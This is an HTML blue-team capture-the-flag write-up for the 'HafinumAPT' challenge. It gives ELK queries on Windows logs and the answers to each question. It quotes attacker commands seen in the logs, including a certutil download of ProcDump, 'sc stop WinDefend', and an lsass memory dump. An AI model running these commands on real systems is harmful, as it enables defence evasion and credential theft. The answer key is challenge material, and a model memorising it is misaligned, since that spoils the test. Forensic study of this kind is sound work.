<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>NaturalWalker - HafinumAPT</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&family=Monofett&display=swap" rel="stylesheet">     <link rel="stylesheet" href="../main.css">
</head>
<body>
	<h6><a href="../index.html"><-- Home</a></h6>
    <div class="typeme"><span class="text-secondary">Natural </span><span class="text-background">~ </span><span class="cursor">$ </span>cat HafinumAPT</div>
       <section class="output">
	<div class="titre-avec-icon">
 		<img src="HafinumAPT.png" alt="HafinumAPT-icon" class="icone">
 		<h1>HafinumAPT</h1>
	</div>
	<h3 class="hard">Difficult</h3>
	<h6><a href="https://cyberdefenders.org/blueteam-ctf-challenges/hafinumapt/" target="_blank">https://cyberdefenders.org/blueteam-ctf-challenges/hafinumapt/</a></h6>
    
	<h2>-- Sc√©nario --</h2>
	<p>You work as a soc analyst for a consulting firm that specializes in digital forensics and incident response. You are assigned to investigate a security incident that occurred at a manufacturing plant that produces electronic components. The plant uses a variety of industrial control systems (ICS) to manage their production lines and other critical operations.

The security team at the plant detected suspicious network activity from an external IP address associated with the Hafnium threat actor group.

Your task is to investigate the incident and determine the extent of the compromise, the attacker's objectives, and the potential impact on the plant's operations. You have been provided with log files from the plant's servers and workstations, which include Windows event logs and TeamViewer logs. You must analyze the logs and gathering information about the attacker's activity.</p>
	</br></br>
	<h2>-- Analysis --</h2>
	<ul><li>Provided Files :</li>
		<ul>
			<li>Event logs</li>
		</ul>
	</ul>
	<ul>
		<li>Useful tools :</li>
		<ul>
			<li>ELK</li>
		</ul>
	</ul>
</br></br>
<article>
    <h3>Q1: What is the name of the threat detected by Windows Defender?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index : * and event.code : &quot;1116&quot;</code></pre><figure><a href="Untitled.png"><img style="width:1191px" src="Untitled.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>Trojan:Win32/Ceprolad.A</strong></p></details></ul><p>
</p><h3>Q2: What was the full URL that Windows Defender blocked an archive from being downloaded?</h3><p>
</p><figure><a href="Untitled%201.png"><img style="width:1564px" src="Untitled%201.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>https://download.sysinternals.com/files/Procdump.zip</strong></p></details></ul><p>
</p><h3>Q3: What was the full command used by the attacker to successfully download the archive?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND event.code: &quot;1&quot; AND winlog.event_data.CommandLine:*procdump*</code></pre><figure><a href="Untitled%202.png"><img style="width:1566px" src="Untitled%202.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>certutil.exe -urlcache -split -f &quot;https://download.sysinternals.com/files/Procdump.zip&quot; procdump.zip</strong></p><p>
</p></details></ul><p>
</p><h3>Q4: Which user account was the attacker using when the archive was successfully downloaded to the host?</h3><figure><a href="Untitled%203.png"><img style="width:1322px" src="Untitled%203.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>Administrator</strong></p></details></ul><p>
</p><h3>Q5: What command was used by the attacker on the host to try and disable Windows Defender via the command line?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND event.code: &quot;1&quot;  and winlog.event_data.User: &quot;POOPCONTROLLER\Administrator&quot; and 
winlog.event_data.CommandLine : *WinDefend*</code></pre><figure><a href="Untitled%204.png"><img style="width:1560px" src="Untitled%204.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>sc stop WinDefend</strong></p><p>
</p></details></ul><p>
</p><h3>Q6: Provide the date and time when Windows Defender&#x27;s real-time protection was disabled.  (24H-UTC)</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND event.code: &quot;5001&quot;</code></pre><figure><a href="Untitled%205.png"><img style="width:708px" src="Untitled%205.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>2021-03-12 08:21:35</strong></p><p>
</p></details></ul><p>
</p><h3>Q7: Which version of ProcDump did the attacker run on the host?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND winlog.event_data.CommandLine:*procdump*</code></pre><p><em>winlog.event_data.FileVersion</em> field refers to the version number of a file associated with an event in Windows event logs.</p><figure><a href="Untitled%206.png"><img style="width:1585px" src="Untitled%206.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>10.0</strong></p><p>
</p></details></ul><p>
</p><h3>Q8: Where is the executable located on the disk that was targeted by Procdump to dump its process memory?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND winlog.event_data.CommandLine:*procdump*</code></pre><figure><a href="Untitled%207.png"><img style="width:708px" src="Untitled%207.png"/></a></figure><p>If we are unsure about the location of a windows system service, i like to use EchoTrail site: <a href="https://www.echotrail.io/insights/search/lsass.exe">https://www.echotrail.io/insights/search/lsass.exe</a></p><figure><a href="Untitled%208.png"><img style="width:336px" src="Untitled%208.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>C:\Windows\system32\lsass.exe</strong></p></details></li></ul><p>
</p><h3>Q9: What was the location of the dump file created from the process dumped with Procdump?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND winlog.event_data.CommandLine:*procdump*</code></pre><figure><a href="Untitled%209.png"><img style="width:678px" src="Untitled%209.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>c:\tmp\lsass.dmp</strong></p><p>
</p></details></ul><p>
</p><h3>Q10: Provide the SHA256 hash value of the Teamviewer installation to check if the legitimate version was installed.</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND event.code : &quot;1&quot; and winlog.event_data.Image:*TeamViewer*</code></pre><figure><a href="Untitled%2010.png"><img style="width:1372px" src="Untitled%2010.png"/></a></figure><figure><a href="Untitled%2011.png"><img style="width:708px" src="Untitled%2011.png"/></a></figure><figure><a href="Untitled%2012.png"><img style="width:288px" src="Untitled%2012.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>D256F177A3DD8E7346B3FA9D32C4690B611F104E7CE175E99C5757BE6EEF229B</strong></p><p>
</p></details></ul><h3>Q11: What was the domain looked up in the first DNS query done by the TeamViewer application after it was installed?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * and event.code: &quot;22&quot; and winlog.event_data.Image:*TeamViewer*</code></pre><figure><a href="Untitled%2013.png"><img style="width:1528px" src="Untitled%2013.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>router7.teamviewer.com</strong></p><p>
</p></details></ul><p>
</p><h3>Q12: Determine how the attacker gained access to the Administrator account.</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * and event.code: &quot;4625&quot; or event.code: &quot;4624&quot;</code></pre><figure><a href="Untitled%2014.png"><img style="width:1362px" src="Untitled%2014.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>Brute-force attack</strong></p><p>
</p></details></ul><p>
</p><h3>Q13: What IP address can we send to the Firewall team for blocking?</h3><p><em><strong>Windows Sysmon (Event ID 3 - Network Connection)</strong></em><em>:</em> Sysmon logs network connection events</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * and event.code: &quot;3&quot;</code></pre><figure><a href="Untitled%2015.png"><img style="width:708px" src="Untitled%2015.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>8.36.216.58</strong></p><p>
</p></details></ul><p>
</p><h3>Q14: What was the hostname from where the attacker launched their attack?</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * and event.code: &quot;4625&quot; //and look for one of the last try before he successfully logged in</code></pre><figure><a href="Untitled%2016.png"><img style="width:1547px" src="Untitled%2016.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>FancyPoodle</strong></p><p>
</p></details></ul><p>
</p><h3>Q15: Provide the first timestamp from the logs where you can see the attacker was successful in logging.  (24H-UTC)</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">_index: * AND event.code: &quot;4624&quot; and winlog.event_data.WorkstationName: &quot;FancyPoodle&quot;</code></pre><figure><a href="Untitled%2017.png"><img style="width:1049px" src="Untitled%2017.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>2021-03-11 20:26:52</strong></p><p>
</p></details></ul><p>
</p><h3>Q16: Provide the data in UTC time of when the attacker successfully logged into the host using RDP for the first time.  (24H-UTC)</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre><code class="language-PowerShell">  _index: * AND event.code: &quot;21&quot; and winlog.user_data.Address:&quot;8.36.216.58&quot;</code></pre><p>Event ID 21 with the source &quot;LocalSessionManager&quot; typically indicates a &quot;Remote Desktop Services session logon succeeded&quot; event. This event is logged when a user successfully logs on to a Remote Desktop</p><figure><a href="Untitled%2018.png"><img style="width:1456px" src="Untitled%2018.png"/></a></figure><ul class="toggle"><details close=""><summary>Answer</summary><p><strong>2021-03-12 08:03:02</strong></p></details></ul><p>
</p><p>
</p><h3>RUNNED OUT OF TIME OF THE FREE TRIAL</h3></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span>
</body>
</html>
